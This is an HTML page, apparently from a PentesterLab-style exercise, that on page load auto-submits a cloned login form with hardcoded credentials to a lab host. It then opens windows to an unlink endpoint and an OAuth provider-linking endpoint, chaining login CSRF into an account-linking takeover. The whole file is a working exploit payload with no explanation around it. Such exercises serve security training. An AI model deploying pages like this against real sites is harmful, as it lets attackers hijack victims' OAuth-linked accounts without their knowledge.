<form id="new_user" action="http://authorization-ptl-9373b9015c71-16b2c9c94691.libcurl.me/users/sign_in"
    accept-charset="UTF-8" method="post">
    <input type="hidden" name="authenticity_token" value="WtA4T8Gn9i6xW9m7R/OtujK8Ykozxjg9jIJ/FO//H76sqr8ETCKPQ2kQhLIkihH4w37JhrpVCM75MtoAP4jzWw==">
    <input autofocus="autofocus" autocomplete="email" type="email" value="martin@gmail.com" name="user[email]"
        id="user_email">
    <input autocomplete="current-password" type="password" name="user[password]" id="user_password" value="123456">
    <input name="user[remember_me]" type="hidden" value="1">
    <input type="checkbox" value="1" name="user[remember_me]" id="user_remember_me">
    <input type="submit" name="commit" value="Log in" data-disable-with="Log in">
</form>

<script>
    window.onload = function () {
        var form = document.getElementById("new_user");
        var formClone = form.cloneNode(true); // clone the form
        formClone.target = '_blank'; // set target to blank to open in new tab
        document.body.appendChild(formClone); // append the cloned form to the body
        formClone.submit(); // submit the cloned form
        document.body.removeChild(formClone); // remove the cloned form from the body

        var unlink_window = window.open('http://ptl-9373b9015c71-16b2c9c94691.libcurl.me/unlink', '_blank');

        setTimeout(function () {
            unlink_window.close();
            link_window = window.open("http://ptl-9373b9015c71-16b2c9c94691.libcurl.me/users/auth/myprovider")
            setTimeout(function () {
                link_window.close(); // close
            }, 500 );
        }, 500);
    }
</script>